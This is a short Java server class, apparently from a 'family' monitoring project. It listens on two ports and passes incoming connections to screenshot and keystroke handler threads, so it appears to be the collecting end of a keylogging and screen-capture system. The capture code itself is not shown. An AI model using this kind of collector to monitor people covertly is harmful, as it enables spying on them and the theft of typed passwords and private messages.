package com.family.server.service;

import java.net.ServerSocket;
import java.net.Socket;

public class ServerBusiness extends Thread {
	public ServerBusiness()
	{
		
	}
	
	public void run()
	{
		try
		{
			ServerSocket server1 = new ServerSocket(5000);

			ServerSocket server2 = new ServerSocket(2345);
			while(true)
			{
				try
				{
					Socket soc1 = server1.accept();
					ScreenshotBusiness sb = new ScreenshotBusiness(soc1);
					sb.start();
					Socket soc2 = server2.accept();
					KeyStrokeBusiness ksb = new KeyStrokeBusiness(soc2);
					ksb.start();
				}
				catch(Exception e)
				{
					e.printStackTrace();
				}
			}
		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
	}
}
